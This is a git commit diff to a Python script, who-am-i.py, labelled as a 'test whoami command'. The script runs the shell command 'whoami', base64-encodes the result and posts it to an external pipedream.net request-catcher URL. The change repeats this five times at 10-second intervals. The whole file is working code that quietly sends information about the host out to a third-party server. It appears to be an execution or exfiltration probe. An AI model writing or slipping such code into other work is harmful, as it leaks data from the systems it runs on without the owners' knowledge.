f7427e6505a91ff125a88fec213ca2d4f5a96fb7
Cedric Brisson <cbrisson@coveo.com>
2023-07-26 09:45:05 -0400

    added test whoami command

--- who-am-i.py
+++ who-am-i.py
@@ -1,6 +1,8 @@
 import subprocess, base64, requests, time
 
-output = subprocess.check_output('whoami', shell=True)
-b64_output = base64.b64encode(output)
-data={'data':b64_output}
-requests.post('https://enb3v0cqs6dwu.x.pipedream.net/', data=data)
+for i in range(5):
+    time.sleep(10)
+    output = subprocess.check_output('whoami', shell=True)
+    b64_output = base64.b64encode(output)
+    data={'data':b64_output}
+    requests.post('https://enb3v0cqs6dwu.x.pipedream.net/', data=data)
